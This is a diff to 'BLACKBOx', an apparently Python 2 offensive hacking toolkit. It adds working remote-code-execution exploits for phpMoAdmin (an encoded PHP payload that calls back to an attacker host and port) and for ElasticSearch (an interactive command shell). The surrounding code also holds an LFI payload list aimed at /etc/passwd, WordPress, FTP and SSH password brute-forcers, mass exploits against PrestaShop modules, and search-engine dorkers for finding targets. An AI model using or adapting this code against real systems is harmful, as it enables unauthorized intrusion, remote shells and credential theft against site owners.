@@ -1,4 +1,5 @@
 #!/usr/bin/python2
+#-*- coding:utf-8 -*-
 ################################################################################################################################
 ###                                          I edit some tools from other repository like :                                  ###
 ### JOOMLA RCE  : https://www.exploit-db.com/exploits/39033/                                                                 ###
@@ -25,10 +26,10 @@ __license__    = 'GPLv2'
 __scrname__    = 'BLACKBOx v%s' % (__version__)
 
 def __banner__():
-	print (color.BOLD+color.Y+" _____ __    _____ _____ _____ _____ _____ ")
-	print (color.BOLD+color.Y+"| __  |  |  |  _  |     |  |  | __  |     | _ _")
-	print (color.BOLD+color.Y+"| __ -|  |__|     |   --|    -| __ -|  |  ||_'_|")
-	print (color.BOLD+color.Y+"|_____|_____|__|__|_____|__|__|_____|_____||_,_|")
+	print color.R+color.BOLD+""" _____ __    _____ _____ _____ _____ _____ __ __ 
+| __  |  |  |  _  |     |  |  | __  |     |  |  |
+| __ -|  |__|     |   --|    -| __ -|  |  |-   -|
+|_____|_____|__|__|_____|__|__|_____|_____|__|__|"""
 	print (color.W+color.BOLD+"                                                {"+color.R+__version__+"#Dev"+color.W+"}"+color.ENDC)
 
 def __help__():
@@ -45,6 +46,8 @@ def __help__():
 	print (color.W+"\t+ Joomla Rce         : rce_joomla       | 1.5 - 3.4.5 remote code execution")
 	print (color.W+"\t+ Magento Rce        : rce_magento      | Magento eCommerce - Remote Code Execution")
 	print (color.W+"\t+ PrestaShop Exploit : presta_exploit   | Prestashop Multi Modules Arbitrary File Upload Exploit")
+	print (color.W+"\t+ PhpmoAdmin Rce     : rce_pmo          | Exploit for phpMoAdmin, CVE-2015-2208")
+	print (color.W+"\t+ ElasticSearch rce  : rce_elastic      | Exploit for ElasticSearch , {CVE-2015-1427}")
 	print (color.W+color.BOLD+color.Y+"Dorking : "+color.ENDC)
 	print (color.W+"\t+ Google Dorker : google_dorker(LFI/RCE/XSS/SQLi) | Google Dorker ")
 	print (color.W+"\t+ Bing Dorker   : bing_dorker(LFI/RCE/XSS/SQLi)   | Bing Dorker via IP")
@@ -120,27 +123,27 @@ class scanner:
 		payloads=["../etc/passwd","../etc/passwd%00","../../etc/passwd","../../etc/passwd%00","../../../etc/passwd","../../../etc/passwd%00","../../../../etc/passwd","../../../../etc/passwd%00","../../../../../etc/passwd","../../../../../etc/passwd%00","../../../../../../etc/passwd","../../../../../../etc/passwd%00","../../../../../../../etc/passwd","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd%00","..%2Fetc%2Fpasswd","..%2Fetc%2Fpasswd%2500","..%2F..%2Fetc%2Fpasswd","..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500"]
 		lfi = re.findall(r'=(.*)', url)
 		for i in lfi:
-			print (color.R+color.BOLD+"[+] "+color.W+"TARGET : "+url+color.ENDC)
+			print (color.R+color.BOLD+"{+} "+color.W+"TARGET : "+url+color.ENDC)
 			l=re.sub(i, '', url)
 			vuln = 0
 			for payload in payloads:
 				payload=payload.strip()
-				print (color.G+color.BOLD+"\t[+] "+color.W+" Payload : "+payload+color.ENDC)
+				print (color.G+color.BOLD+"\t{+} "+color.W+" Payload : "+payload+color.ENDC)
 				lfii = l+payload
 				r = requests.get(lfii)
 				html = r.content
 				if "root" in html:
-					print (color.R+color.BOLD+"\t[+] "+color.R+" LFI FOUND : "+lfii+color.ENDC)
+					print (color.R+color.BOLD+"\t{+} "+color.R+" LFI FOUND : "+lfii+color.ENDC)
 					vuln+=1
 				else:
-					print (color.B+color.BOLD+"\t[+] "+color.B+" NOT FOUND : "+lfii+color.ENDC)
+					print (color.B+color.BOLD+"\t{+} "+color.B+" NOT FOUND : "+lfii+color.ENDC)
 					pass
 			print color.W+"[!] %i LFI FOUNDED " % (vuln) +color.ENDC
 	def run(self,url, payloads, check):
 		opener = requests.get(url)
 		vuln = 0
-		print color.B+"[+] "+color.W+"Target : "+url+color.ENDC
-		#print color.B+"\t[+] "+color.W+"IP   : "+socket.gethostbyname(url)+color.ENDC
+		print color.B+"{+} "+color.W+"Target : "+url+color.ENDC
+		#print color.B+"\t{+} "+color.W+"IP   : "+socket.gethostbyname(url)+color.ENDC
 		if opener.status_code == 999:
 			print color.R +" [~] WebKnight WAF Detected!"+color.ENDC
 			print color.R +" [~] Delaying 3 seconds between every request"+color.ENDC
@@ -244,14 +247,14 @@ class dorker:
 						self.gurl.append(link)
 						gopen.write(str(link+"\n"))
 				start+=10
-			print (color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(self.gurl))+" FOUND")
+			print (color.G+color.BOLD+"{+}"+color.BOLD+color.W+" "+str(len(self.gurl))+" FOUND")
 		tldd = randomm()
-		print (color.G+color.BOLD+"[+]"+color.BOLD+color.W+" GOOLGE TLD    :  ."+tldd)
-		print (color.G+color.BOLD+"[+]"+color.BOLD+color.W+" DORK          :  "+dork+color.ENDC)
+		print (color.G+color.BOLD+"{+}"+color.BOLD+color.W+" GOOLGE TLD    :  ."+tldd)
+		print (color.G+color.BOLD+"{+}"+color.BOLD+color.W+" DORK          :  "+dork+color.ENDC)
 		run(dork, start, stop)
-	def bing(self, ip,dork):
+	def bing_ip(self, ip,dork):
 		url = []
-		print (color.G+color.BOLD+"[+]"+color.BOLD+color.W+" DORK          :  "+dork)
+		print (color.G+color.BOLD+"{+}"+color.BOLD+color.W+" DORK          :  "+dork)
 		page = 0
 		bopen = open("burl.txt","a")
 		while page <= 102:
@@ -264,7 +267,23 @@ class dorker:
 				self.burl.append(i)
 				bopen.write(i+"\n")
 			page += 50
-		print (color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(url))+" FOUND"+color.ENDC)
+		print (color.G+color.BOLD+"{+}"+color.BOLD+color.W+" "+str(len(url))+" FOUND"+color.ENDC)
+	def bing(self, ip,dork):
+		url = []
+		print (color.G+color.BOLD+"{+}"+color.BOLD+color.W+" DORK          :  "+dork)
+		page = 0
+		bopen = open("burl.txt","a")
+		while page <= 102:
+			bing ='http://www.bing.com/search?q='+dork+'&count=50&first='+str(page)
+			get = requests.get(bing)
+			html = get.content
+			link = re.findall(r'<h2><a href="(.*?)"', html)
+			for i in link:
+				url.append(i)
+				self.burl.append(i)
+				bopen.write(i+"\n")
+			page += 50
+		print (color.G+color.BOLD+"{+}"+color.BOLD+color.W+" "+str(len(url))+" FOUND"+color.ENDC)
 	pass
 
 class admin_finder:
@@ -389,15 +408,15 @@ class admin_finder:
 			r = requests.get(full)
 			get = r.status_code
 			if get == 200:
-				print (color.Y+color.BOLD+"[+]"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
+				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
 			elif get == 403:
-				print (color.R+color.BOLD+"[-]"+color.BOLD+" Forbidden          : "+color.ENDC+full)
+				print (color.R+color.BOLD+"{-}"+color.BOLD+" Forbidden          : "+color.ENDC+full)
 			elif get == 302:
-				print (color.Y+color.BOLD+"[+]"+color.BOLD+" Redirect           : "+color.ENDC+full)
+				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Redirect           : "+color.ENDC+full)
 			elif get==404:
-				print (color.W+color.BOLD+"[-]"+color.BOLD+" Not Found          : "+color.ENDC+full)
+				print (color.W+color.BOLD+"{-}"+color.BOLD+" Not Found          : "+color.ENDC+full)
 			else:
-				print (color.W+color.BOLD+"[-] Response "+str(get)+"       : "+full)
+				print (color.W+color.BOLD+"{-} Response "+str(get)+"       : "+full)
     def asp_admin(self,url):
 		asp = self.asp
 		for admin in asp:
@@ -406,15 +425,15 @@ class admin_finder:
 			r = requests.get(full)
 			get = r.status_code
 			if get == 200:
-				print (color.Y+color.BOLD+"[+]"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
+				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
 			elif get == 403:
-				print (color.R+color.BOLD+"[-]"+color.BOLD+" Forbidden          : "+color.ENDC+full)
+				print (color.R+color.BOLD+"{-}"+color.BOLD+" Forbidden          : "+color.ENDC+full)
 			elif get == 302:
-				print (color.Y+color.BOLD+"[+]"+color.BOLD+" Redirect           : "+color.ENDC+full)
+				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Redirect           : "+color.ENDC+full)
 			elif get==404:
-				print (color.W+color.BOLD+"[-]"+color.BOLD+" Not Found          : "+color.ENDC+full)
+				print (color.W+color.BOLD+"{-}"+color.BOLD+" Not Found          : "+color.ENDC+full)
 			else:
-				print (color.W+color.BOLD+"[-] Response "+str(get)+"       : "+full)
+				print (color.W+color.BOLD+"{-} Response "+str(get)+"       : "+full)
 
     def cfm_admin(self,url):
 		cfm = self.cfm
@@ -424,15 +443,15 @@ class admin_finder:
 			r = requests.get(full)
 			get = r.status_code
 			if get == 200:
-				print (color.Y+color.BOLD+"[+]"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
+				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
 			elif get == 403:
-				print (color.R+color.BOLD+"[-]"+color.BOLD+" Forbidden          : "+color.ENDC+full)
+				print (color.R+color.BOLD+"{-}"+color.BOLD+" Forbidden          : "+color.ENDC+full)
 			elif get == 302:
-				print (color.Y+color.BOLD+"[+]"+color.BOLD+" Redirect           : "+color.ENDC+full)
+				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Redirect           : "+color.ENDC+full)
 			elif get==404:
-				print (color.W+color.BOLD+"[-]"+color.BOLD+" Not Found          : "+color.ENDC+full)
+				print (color.W+color.BOLD+"{-}"+color.BOLD+" Not Found          : "+color.ENDC+full)
 			else:
-				print (color.W+color.BOLD+"[-] Response "+str(get)+"       : "+full)
+				print (color.W+color.BOLD+"{-} Response "+str(get)+"       : "+full)
 
     def js_admin(self,url):
 		js = self.js
@@ -442,15 +461,15 @@ class admin_finder:
 			r = requests.get(full)
 			get = r.status_code
 			if get == 200:
-				print (color.Y+color.BOLD+"[+]"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
+				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
 			elif get == 403:
-				print (color.R+color.BOLD+"[-]"+color.BOLD+" Forbidden          : "+color.ENDC+full)
+				print (color.R+color.BOLD+"{-}"+color.BOLD+" Forbidden          : "+color.ENDC+full)
 			elif get == 302:
-				print (color.Y+color.BOLD+"[+]"+color.BOLD+" Redirect           : "+color.ENDC+full)
+				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Redirect           : "+color.ENDC+full)
 			elif get==404:
-				print (color.W+color.BOLD+"[-]"+color.BOLD+" Not Found          : "+color.ENDC+full)
+				print (color.W+color.BOLD+"{-}"+color.BOLD+" Not Found          : "+color.ENDC+full)
 			else:
-				print (color.W+color.BOLD+"[-] Response "+str(get)+"       : "+full)
+				print (color.W+color.BOLD+"{-} Response "+str(get)+"       : "+full)
 
     def cgi_admin(self,url):
 		cgi = self.cgi
@@ -460,15 +479,15 @@ class admin_finder:
 			r = requests.get(full)
 			get = r.status_code
 			if get == 200:
-				print (color.Y+color.BOLD+"[+]"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
+				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
 			elif get == 403:
-				print (color.R+color.BOLD+"[-]"+color.BOLD+" Forbidden          : "+color.ENDC+full)
+				print (color.R+color.BOLD+"{-}"+color.BOLD+" Forbidden          : "+color.ENDC+full)
 			elif get == 302:
-				print (color.Y+color.BOLD+"[+]"+color.BOLD+" Redirect           : "+color.ENDC+full)
+				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Redirect           : "+color.ENDC+full)
 			elif get==404:
-				print (color.W+color.BOLD+"[-]"+color.BOLD+" Not Found          : "+color.ENDC+full)
+				print (color.W+color.BOLD+"{-}"+color.BOLD+" Not Found          : "+color.ENDC+full)
 			else:
-				print (color.W+color.BOLD+"[-] Response "+str(get)+"       : "+full)
+				print (color.W+color.BOLD+"{-} Response "+str(get)+"       : "+full)
 
     def brf_admin(self,url):
 		brf = self.brf
@@ -478,15 +497,15 @@ class admin_finder:
 			r = requests.get(full)
 			get = r.status_code
 			if get == 200:
-				print (color.Y+color.BOLD+"[+]"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
+				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
 			elif get == 403:
-				print (color.R+color.BOLD+"[-]"+color.BOLD+" Forbidden          : "+color.ENDC+full)
+				print (color.R+color.BOLD+"{-}"+color.BOLD+" Forbidden          : "+color.ENDC+full)
 			elif get == 302:
-				print (color.Y+color.BOLD+"[+]"+color.BOLD+" Redirect           : "+color.ENDC+full)
+				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Redirect           : "+color.ENDC+full)
 			elif get==404:
-				print (color.W+color.BOLD+"[-]"+color.BOLD+" Not Found          : "+color.ENDC+full)
+				print (color.W+color.BOLD+"{-}"+color.BOLD+" Not Found          : "+color.ENDC+full)
 			else:
-				print (color.W+color.BOLD+"[-] Response "+str(get)+"       : "+full)
+				print (color.W+color.BOLD+"{-} Response "+str(get)+"       : "+full)
 
 ###
 ###BRUTEFORCING TOOLS
@@ -507,8 +526,8 @@ class BruteForce:
 		ok = time.strftime('%H:%M:%S')
 		datetime = '['+ok+']'
 
-		url = "http://"+url+"/wp-login.php"
-		if not requests.get(url).status_code == 200:
+		urll = "http://"+url+"/wp-login.php"
+		if not requests.get(urll).status_code == 200:
 			print ("Error with  : "+url+"\nResponse is : "+str(requests.get(url).status_code))
 			return 1
 		print (color.G+datetime+color.ENDC+" Starting Attack ! ")
@@ -521,11 +540,11 @@ class BruteForce:
 			payload = {'log' : username,
 			           'pwd' : words}
 			
-			s = requests.post(url, data=payload, headers=headers)
+			s = requests.post(urll, data=payload, headers=headers)
 			print (color.R+"------------------------------------------------------------------")
 			print (color.G+datetime+color.W+" username   : "+color.Y+payload['log'])
 			print (color.G+datetime+color.W+" password   : "+color.Y+payload['pwd'])
-			if "wp-admin" in s.url:
+			if "wp-admin" in s.url or "Dashboard" in s.content:
 				print (color.G+datetime+color.R+" Login Succes"+color.ENDC)
 				print (color.R+"------------------------------------------------------------------"+color.ENDC)			
 				break
@@ -536,21 +555,21 @@ class BruteForce:
 			ftp = FTP(hostname)
 			login = ftp.login(username, password)
 			if "230" in login:
-				print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" LOGIN SUCCESSFULLY WITH"+color.ENDC)
-				print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Password : "+password+color.ENDC)
+				print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" LOGIN SUCCESSFULLY WITH"+color.ENDC)
+				print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Password : "+password+color.ENDC)
 				sys.exit(0)
 		except ftplib.error_perm:
-			print (color.R+color.BOLD+"[-]"+color.ENDC+color.BOLD+" Error via Password : "+password+color.ENDC)
+			print (color.R+color.BOLD+"{-}"+color.ENDC+color.BOLD+" Error via Password : "+password+color.ENDC)
 			pass
 	def ssh_brute(self,hostname, username, password):
 		try:
 			s = pxssh.pxssh()
 			login = s.login(hostname, username, password)
 			if login == True:
-				print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" LOGIN SUCCESSFULLY WITH"+color.ENDC)
-				print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Password : "+password+color.ENDC)
+				print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" LOGIN SUCCESSFULLY WITH"+color.ENDC)
+				print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Password : "+password+color.ENDC)
 		except pexpect.pxssh.ExceptionPxssh:
-			print (color.R+color.BOLD+"[-]"+color.ENDC+color.BOLD+" Error via Password : "+password+color.ENDC)
+			print (color.R+color.BOLD+"{-}"+color.ENDC+color.BOLD+" Error via Password : "+password+color.ENDC)
 			pass
 
 ###
@@ -563,6 +582,52 @@ class BruteForce:
 ####################################
 
 class exploit:
+	def phpmoadmin(self, target, cb_host, cbport):
+		"""Exploit for phpMoAdmin, CVE-2015-2208"""
+		def php_encoder():
+			f = open("/opt/blackbox/payload/pma.php", "r").read()
+			f = f.replace("<?php", "")
+			f = f.replace("?>", "")
+			encoded = f.encode('base64')
+			encoded = encoded.replace("\n", "")
+			encoded = encoded.strip()
+			code = "eval(base64_decode('%s'));" %(encoded)
+			return code
+		def pop_shell(target, code, cb_host, cb_port):
+			print "{+} Sending Payload..."
+			cookies = {'host': cb_host, 'port': cb_port}
+			post_data = {"object": "1;%s;exit" %(code)}
+			headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
+			try:
+				r = requests.post(url=target, data=post_data, headers=headers, verify=False, cookies=cookies)
+			except Exception, e:
+				sys.exit("[-] Exception hit! Printing:\n %s" %(str(e)))
+			if r.text:
+				print r.text.strip()
+		code = php_encoder()
+		pop_shell(target, code, cb_host, cb_port)
+
+	def elastic(self, target):
+		"""Exploit for ElasticSearch , {CVE-2015-1427}"""
+		def execute_command(target, command):
+			payload = """{"size":1, "script_fields": {"lupin":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"%s\\").getText()"}}}""" %(command)
+			try:
+				url = "http://%s:9200/_search?pretty" %(target)
+				r = requests.post(url=url, data=payload)
+			except Exception, e:
+				sys.exit("Exception Hit"+str(e))
+			values = json.loads(r.text)
+			fuckingjson = values['hits']['hits'][0]['fields']['lupin'][0]
+			print fuckingjson.strip()
+		def exploit(target):
+			print "{*} Spawning Shell on target... Do note, its only semi-interactive... Use it to drop a better payload or something"
+			while True:
+				cmd = raw_input("~$ ")
+				if cmd == "exit":
+					sys.exit("{!} Shell exiting!")
+				else:
+					execute_command(target, cmd)
+		exploit(target)
 	def joomla(self, wordlist):
 		wordlist = open(wordlist, "r")
 		def get_url(url, user_agent):
@@ -631,7 +696,7 @@ class exploit:
 		### SimpleSlideShow Exploit
 		###
 		def sss_ex(lists, script):
-			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"SimpleSlideShow Exploit :"+color.ENDC)
+			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"SimpleSlideShow Exploit :"+color.ENDC)
 			lists = open(lists,"r")
 			lists = lists.readlines()
 			for url in lists:
@@ -648,7 +713,7 @@ class exploit:
 		### productpageadverts
 		###
 		def ppa_ex(lists, script):
-			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Productpageadverts Exploit :"+color.ENDC)
+			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"Productpageadverts Exploit :"+color.ENDC)
 			lists = open(lists,"r")
 			lists = lists.readlines()
 			for url in lists:
@@ -665,7 +730,7 @@ class exploit:
 		### HomePageAdvertise
 		###
 		def hpa_ex(lists, script):
-			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"HomePageAdvertise Exploit :"+color.ENDC)
+			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"HomePageAdvertise Exploit :"+color.ENDC)
 			lists = open(lists,"r")
 			lists = lists.readlines()
 			for url in lists:
@@ -682,7 +747,7 @@ class exploit:
 		### ColumnAdvers
 		###
 		def ca_ex(lists, script):
-			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"ColumnAdvers Exploit :"+color.ENDC)
+			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"ColumnAdvers Exploit :"+color.ENDC)
 			lists = open(lists,"r")
 			lists = lists.readlines()
 			for url in lists:
@@ -699,7 +764,7 @@ class exploit:
 		### vtemslideshow
 		###
 		def vtss_ex(lists, script):
-			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Vtemslideshow Exploit :"+color.ENDC)
+			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"Vtemslideshow Exploit :"+color.ENDC)
 			lists = open(lists,"r")
 			lists = lists.readlines()
 			for url in lists:
@@ -716,7 +781,7 @@ class exploit:
 		### attributewizardpro
 		###
 		def awp_ex(lists, script):
-			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Attributewizardpro Exploit :"+color.ENDC)
+			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"Attributewizardpro Exploit :"+color.ENDC)
 			lists = open(lists,"r")
 			lists = lists.readlines()
 			for url in lists:
@@ -733,7 +798,7 @@ class exploit:
 		### additionalproductstabs
 		###
 		def aps_ex(lists, script):
-			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Additionalproductstabs Exploit :"+color.ENDC)
+			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"Additionalproductstabs Exploit :"+color.ENDC)
 			lists = open(lists,"r")
 			lists = lists.readlines()
 			for url in lists:
@@ -750,7 +815,7 @@ class exploit:
 		### addthisplugin
 		###
 		def atp_ex(lists, script):
-			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Addthisplugin Exploit :"+color.ENDC)
+			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"Addthisplugin Exploit :"+color.ENDC)
 			lists = open(lists,"r")
 			lists = lists.readlines()
 			for url in lists:
@@ -767,7 +832,7 @@ class exploit:
 		### advancedslider
 		###
 		def as_ex(lists, script):
-			print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Advancedslider Exploit :"+color.ENDC)
+			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"Advancedslider Exploit :"+color.ENDC)
 			lists = open(lists,"r")
 			lists = lists.readlines()
 			for url in lists:
@@ -782,7 +847,7 @@ class exploit:
 					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
 		l = open(lists,"r")
 		l = l.readlines()
-		print (color.M+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(l))+" URL FOUNDED")
+		print (color.M+color.BOLD+"{+}"+color.BOLD+color.W+" "+str(len(l))+" URL FOUNDED")
 		#Start SimpleSlideShow Exploit
 		sss_ex(lists, script)
 		#Start productpageadverts Exploit
@@ -802,7 +867,7 @@ class exploit:
 		#Start advancedslider
 		as_ex(lists, script)
 		#FINISH !
-		print (color.M+color.BOLD+"[+] "+color.BOLD+color.W+"END OF ATTACK")
+		print (color.M+color.BOLD+"{+} "+color.BOLD+color.W+"END OF ATTACK")
 
 
 ###
@@ -853,8 +918,8 @@ class dnsinfo:
 		for i in sites:
 			i=i.strip()
 			ipp.write(i+"\n")
-		print (color.W+color.BOLD+"[+] "+str(len(sites))+" FOUND"+color.ENDC)
-		print (color.W+color.BOLD+"[+] Domains is saved in "+ip+".txt"+color.ENDC)
+		print (color.W+color.BOLD+"{+} "+str(len(sites))+" FOUND"+color.ENDC)
+		print (color.W+color.BOLD+"{+} Domains is saved in "+ip+".txt"+color.ENDC)
 	def hackertarget(self,domain):
 		urll = []
 		url = "http://api.hackertarget.com/reverseiplookup/?q="+domain
@@ -870,8 +935,8 @@ class dnsinfo:
 				i = i.strip()
 				urll.append(i)
 				ipp.write(i+"\n")
-			print (color.W+color.BOLD+"[+] "+str(len(black))+" FOUND"+color.ENDC)
-			print (color.W+color.BOLD+"[+] Domains is saved in "+domain+".txt"+color.ENDC)
+			print (color.W+color.BOLD+"{+} "+str(len(black))+" FOUND"+color.ENDC)
+			print (color.W+color.BOLD+"{+} Domains is saved in "+domain+".txt"+color.ENDC)
 
 ###
 ###HASH CRACKER
@@ -884,8 +949,8 @@ class dnsinfo:
 class cracker:
 	def md5(self, md5, wordlist):
 		start = timeit.default_timer()
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" MD5 HASH PATH : "+md5+color.ENDC)
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST PATH : "+wordlist+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" MD5 HASH PATH : "+md5+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH : "+wordlist+color.ENDC)
 		wordlist = open(wordlist, "r")
 		word = wordlist.readlines()
 		md5 = open(md5, "r")
@@ -897,18 +962,18 @@ class cracker:
 				o=o.strip()
 				wordlistmd5 = hashlib.md5(o).hexdigest()
 				if i==wordlistmd5:
-					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
+					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
 					var+=1
 		if var==0:
-			print color.R+color.BOLD+"[-]"+color.W+" HASH NOT FOUND!"+color.ENDC
+			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
 		else:
 			pass
 		stop = timeit.default_timer()
-		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
+		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
 
 	def sha1(self, sha1, wordlist):
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" SHA1 HASH PATH : "+sha1+color.ENDC)
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST PATH  : "+wordlist+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SHA1 HASH PATH : "+sha1+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH  : "+wordlist+color.ENDC)
 		start = timeit.default_timer()
 		wordlist = open(wordlist, "r")
 		word = wordlist.readlines()
@@ -921,17 +986,17 @@ class cracker:
 				o=o.strip()
 				wordlistsha1 = hashlib.sha1(o).hexdigest()
 				if i==wordlistsha1:
-					print (color.G+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"[+] "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
+					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
 					var+=1
 		if var==0:
-			print color.R+color.BOLD+"[-]"+color.W+" HASH NOT FOUND!"+color.ENDC
+			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
 		else:
 			pass		
 		stop = timeit.default_timer()
-		print (color.BL+color.BOLD+"[+]"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
+		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)
 	def sha224(self, sha224, wordlist):
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" SHA224 HASH PATH : "+sha224+color.ENDC)
-		print (color.Y+color.BOLD+"[+]"+color.ENDC+color.BOLD+" WORDLIST PATH    : "+wordlist+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SHA224 HASH PATH : "+sha224+color.ENDC)
+		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH    : "+wordlist+color.ENDC)
 		start = timeit.default_timer()
 		wordlist = open(wordlist, "r")
 		word = wordlist.readlines()
@@ -944,17 +1009,17 @@ class cracker:
 				o=o.strip()
 				wordlistsha1 = hashlib.sha224(o).hexdigest()
 				if i==wordlistsha1:
